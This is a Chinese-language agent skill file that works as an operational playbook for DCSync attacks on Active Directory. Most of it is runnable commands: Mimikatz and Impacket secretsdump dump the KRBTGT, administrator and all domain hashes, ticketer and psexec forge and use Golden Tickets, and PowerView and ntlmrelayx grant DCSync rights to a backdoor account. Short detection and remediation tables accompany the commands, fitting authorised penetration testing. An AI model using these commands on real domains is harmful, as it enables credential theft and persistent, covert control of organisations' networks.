---
name: cszh-conducting-domain-persistence-with-dcsync
description: 执行 DCSync 攻击以复制活动目录（Active Directory）凭据，通过提取 KRBTGT、域管理员和服务账户哈希来建立域持久化，并用于创建黄金票据（Golden Ticket）。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 conducting-domain-persistence-with-dcsync），正文按中文原文照录。

**这个技能干什么**：执行 DCSync 攻击以复制活动目录（Active Directory）凭据，通过提取 KRBTGT、域管理员和服务账户哈希来建立域持久化，并用于创建黄金票据（Golden Ticket）。

**什么时候用**：需要按上游中文方法论执行「conducting-domain-persistence-with-dcsync」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 使用 DCSync 实施域持久化

## 概述

DCSync 是一种攻击技术，它滥用微软目录复制服务远程协议（MS-DRSR）来模拟域控制器（Domain Controller）并向目标 DC 请求密码数据。该攻击由 Benjamin Delpy（Mimikatz 作者）和 Vincent Le Toux 引入，利用 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All 扩展权限。任何拥有这些权限的主体（用户或计算机）都可以复制域中任何账户（包括 KRBTGT 账户）的密码哈希。有了 KRBTGT 哈希，攻击者可以伪造黄金票据（Golden Ticket）实现无限期域持久化。DCSync 被归类为 MITRE ATT&CK T1003.006，是 APT 组织（包括 APT28（Fancy Bear）、APT29（Cozy Bear）和 FIN6）使用的关键后渗透技术。

## 目标

- 识别活动目录中具有 DCSync（复制）权限的账户
- 使用 Mimikatz 或 Impacket 的 secretsdump.py 执行 DCSync
- 提取 KRBTGT 账户哈希用于黄金票据创建
- 转储所有域用户密码哈希用于凭据分析
- 伪造黄金票据实现持久化域访问
- 向受控账户授予 DCSync 权限以实现替代持久化
- 记录攻击链和持久化机制

## MITRE ATT&CK 映射

- **T1003.006** - 操作系统凭据转储：DCSync
- **T1558.001** - 窃取或伪造 Kerberos 票据：黄金票据
- **T1222.001** - 文件和目录权限修改：Windows
- **T1098** - 账户操控
- **T1078.002** - 有效账户：域账户

## 实施步骤

### 阶段一：识别具有 DCSync 权限的账户
1. 枚举具有复制权限的主体：
   ```powershell
   # 使用 PowerView
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { ($_.ObjectAceType -match 'Replicating') -and
                    ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
     Select-Object SecurityIdentifier, ObjectAceType

   # 使用 BloodHound Cypher 查询
   MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
   RETURN u.name, d.name
   ```
2. 使用 Impacket 的 FindDelegation 或自定义 LDAP 查询：
   ```bash
   # 使用 Impacket 检查
   findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
   ```
3. 默认具有 DCSync 权限的账户：
   - Domain Admins
   - Enterprise Admins
   - Domain Controllers 组
   - 域控制器上的 SYSTEM

### 阶段二：DCSync 凭据提取
1. 使用 Mimikatz（Windows）：
   ```powershell
   # 转储特定账户（KRBTGT 用于黄金票据）
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

   # 转储域管理员
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"

   # 转储所有域账户
   mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
   ```
2. 使用 Impacket secretsdump.py（Linux）：
   ```bash
   # 转储所有凭据
   secretsdump.py domain.local/admin:'Password123'@10.10.10.1

   # 转储特定用户
   secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1

   # 仅转储 NTLM 哈希（不含 Kerberos 密钥）
   secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1

   # 使用 Kerberos 认证
   export KRB5CCNAME=admin.ccache
   secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
   ```

### 阶段三：黄金票据创建
1. 使用 Mimikatz 和提取的 KRBTGT 哈希：
   ```powershell
   # 创建黄金票据
   mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> /ptt"

   # 创建具有特定组成员资格的票据
   mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> \
     /groups:512,513,518,519,520 /ptt"
   ```
2. 使用 Impacket ticketer.py（Linux）：
   ```bash
   # 创建黄金票据
   ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
     -domain domain.local administrator

   # 使用票据
   export KRB5CCNAME=administrator.ccache
   psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
   ```

### 阶段四：通过 DCSync 权限实现持久化
1. 向受控账户授予 DCSync 权限以实现持久化：
   ```powershell
   # 使用 PowerView - 添加 DS-Replication-Get-Changes-All 权限
   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
     -PrincipalIdentity backdoor_user -Rights DCSync

   # 验证权限已添加
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
   ```
2. 使用 ntlmrelayx.py 自动提升 DCSync 权限：
   ```bash
   # 中继认证以添加 DCSync 权限
   ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
   ```

## 工具与资源

| 工具 | 用途 | 平台 |
|------|---------|----------|
| Mimikatz | DCSync 提取、黄金票据创建 | Windows |
| secretsdump.py | 远程 DCSync（Impacket） | Linux（Python） |
| ticketer.py | 黄金票据创建（Impacket） | Linux（Python） |
| PowerView | ACL 枚举和修改 | Windows（PowerShell） |
| Rubeus | Kerberos 票据操控 | Windows（.NET） |
| ntlmrelayx.py | 通过中继提升 DCSync 权限 | Linux（Python） |

## 需提取的关键哈希

| 账户 | 用途 | 持久化价值 |
|---------|---------|-------------------|
| krbtgt | 黄金票据创建 | 无限期域访问 |
| Administrator | 直接 DA 访问 | 即时特权访问 |
| 服务账户 | 横向移动 | 跨域服务访问 |
| 计算机账户 | 银票据（Silver Ticket）创建 | 服务级模拟 |

## 检测特征

| 指标 | 检测方法 |
|-----------|-----------------|
| 来自非 DC 源的 DrsGetNCChanges RPC 调用 | 监控来自异常 IP 的 DRSUAPI 流量 |
| 含复制目录更改 GUID 的事件 4662 | DC 上的 Windows 安全日志（1131f6aa-/1131f6ad- GUID） |
| 含黄金票据异常的事件 4624 | 登录事件中存在不可能的 SID 或不存在的用户 |
| 域根对象上的 ACL 修改 | 事件 5136（目录服务更改） |
| 复制流量量突增 | 网络基线偏差监控 |

## 验证标准

- [ ] 已枚举具有 DCSync 权限的账户
- [ ] 通过 DCSync 提取了 KRBTGT 哈希
- [ ] 成功转储了所有域凭据
- [ ] 已伪造并验证用于 DA 访问的黄金票据
- [ ] 已建立 DCSync 权限持久化机制（如在范围内）
- [ ] 已通过黄金票据验证对域控制器的访问
- [ ] 已记录包含哈希值和时间戳的证据
- [ ] 已提供修复建议（双重 KRBTGT 重置、ACL 审计）
